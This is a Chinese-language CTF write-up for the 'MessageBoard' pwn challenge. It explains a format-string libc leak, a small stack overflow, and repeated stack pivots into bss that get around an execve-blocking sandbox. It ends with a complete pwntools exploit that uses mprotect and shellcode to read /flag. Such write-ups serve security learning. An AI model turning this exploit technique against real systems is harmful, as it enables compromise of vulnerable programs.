---
title: XHLJ_MessageBoard
date: 2023-03-01 09:17:56
tags:
- ROP
- 栈迁移
- orw
- sandbox
categories:
- pwn_wp
---

一道栈的题目，开了沙箱，需要通过栈溢出利用代码片段进行连续的栈迁移来写入ROP链并跳转执行ROP链。

<!--more-->

保护只开了NX。

```sh
[*] '/home/alphonse/CTF_GAME/XHLJ/MessageBoard/pwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

看看沙箱，禁用了`execve()`

```sh
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x02 0xffffffff  if (A != 0xffffffff) goto 0007
 0005: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0007
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0007: 0x06 0x00 0x00 0x00000000  return KILL
```

程序的漏洞点比较明显，有一个格式化字符串和一个0x10byte的栈溢出

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char *v3; // rax
  char buf[8]; // [rsp+0h] [rbp-C0h] BYREF
  char dest[8]; // [rsp+8h] [rbp-B8h] BYREF
  char v7[176]; // [rsp+10h] [rbp-B0h] BYREF

  init();
  if ( !welcome_count )
  {
    strcpy(dest, "Hello, ");
    puts("Welcome to DASCTF message board, please leave your name:");
    read(0, buf, 8uLL);
    welcome_count = 1;
  }
  v3 = strcat(dest, buf);
  printf(v3);                                   // 格式化字符串
  puts("Now, please say something to DASCTF:");
  read(0, v7, 192uLL);                          // 溢出0x10byte
  puts("Posted Successfully~");
  return 0LL;
}
```

格式化字符串漏洞可以用于leak libcbase或者栈地址。但我们只能输入8byte，因此如果偏移大于10的话，我们只能泄露出一个地址。经过调试可以发现libc地址在**偏移为24**的位置，因此只能泄露栈地址或者libc地址。

如果只泄露栈地址的话，栈迁移回到缓冲区开头处后，由于不知道libcbase，因此利用不了libc中的函数，并且由于NX保护开启，无法ret2shellcode。所以只能选择泄露libc地址，**栈迁移到bss段后走ROP链**。

但接下来就会遇到一个问题，在输入了一次之后程序就结束了，程序中没有直接将ROP链写入bss段，但我们可以**利用主程序中read的代码片段**进行写入，read的代码片段如下：

```asm
.text:0000000000401378 48 8D 85 50 FF FF FF          lea     rax, [rbp+var_B0] var_B0=-0xb0
.text:000000000040137F BA C0 00 00 00                mov     edx, 0C0h                       ; nbytes
.text:0000000000401384 48 89 C6                      mov     rsi, rax                        ; buf
.text:0000000000401387 BF 00 00 00 00                mov     edi, 0                          ; fd
.text:000000000040138C E8 8F FD FF FF                call    _read
```

这里是主程序中调用read函数的片段，在这里对寄存器进行设置并调用read。可以看到rsi是通过`mov rsi, rax`来赋值的，而rax是通过`lea rax, [rbp+0xb0] %算出rbp-0xb0后赋值给rax `来赋值。而栈迁移的时候我们会将rbp设置在bss段上，因此如果我们将返回地址覆盖为`0x401378`那么就会执行`read(0,bss_addr-0xb0,0xc0)`，通过这次读入我们可以将ROP链写到bss段中。

读取ROP链后，rbp指向`bss_addr`，在read完成后的`leave;ret`会将栈迁移到`bss_addr`，并且执行`bss_addr+0x8`处的指令。然而这个位置已经是read读入内容的末尾了，因此需要再次通过栈迁移将栈迁移到read读入内容的开头。这需要让`bss_addr`处的内容为`bss_addr-xxx(读入内容开头的ROP链的位置-0x8)`，使`bss_addr+0x8`处的内容为`leave;ret`。这次会将栈迁移到ROP链处并执行。

ROP链走`mprotect->read->shellcraft.cat('/flag')`来cat flag，当然也可以走`orw`。

exp如下:

```python
from pwn import*
context(log_level='debug',os='linux',arch='amd64')
filename='pwn'
elf=ELF('./'+filename)
# libc=ELF('./2.31-0ubuntu9.7_amd64/libc.so.6')
libc=ELF('./libc.so.6') # remote
p=process('./'+filename)
# p=remote('tcp.cloud.dasctf.com',24407)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\x00'))
uu64    = lambda data               :u64(data.ljust(8,'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()


ru("Welcome to DASCTF message board, please leave your name:\n")
payload='%24$p'

# debug()
sl(payload)

ru('Hello, ')
libcbase=int(ru('\n')[2:],16)-0x1f12e8
leak('libcbase',hex(libcbase))
# debug()


leave=0x4013A2
ret_addr = libcbase + 0x0000000000022679 
pop_rdi=libcbase+0x0000000000023b6a
pop_rsi=libcbase+0x000000000002601f 
pop_rdx=libcbase+0x0000000000142c92 
read_addr = libcbase + libc.sym['read']
mprotect_addr = libcbase + libc.sym['mprotect']
bss_addr=0x404300
vuln=0x0000000000401378

payload=b'a'*176+p64(bss_addr)+p64(vuln)
debug()
s(payload)

# debug()
payload=b'a'*0x10
payload+=p64(ret_addr) 
payload+=p64(pop_rdi) + p64(0x404000)
payload+=p64(pop_rsi) + p64(0x1000)
payload+=p64(pop_rdx) + p64(7)
payload+=p64(mprotect_addr)

payload+=p64(pop_rdi) + p64(0)
payload+=p64(pop_rsi) + p64(0x404500)
payload+=p64(pop_rdx) + p64(0x100)
payload+=p64(read_addr)
payload+=p64(0x404500)
payload=payload.ljust(0xb0,b'\x00')
payload+=p64(bss_addr-0xb0+0x10)+p64(leave)
s(payload)


payload = asm(shellcraft.cat("/flag"))
s(payload)
leak('libcbase',hex(libcbase))
# sleep(0.1)
itr()
```



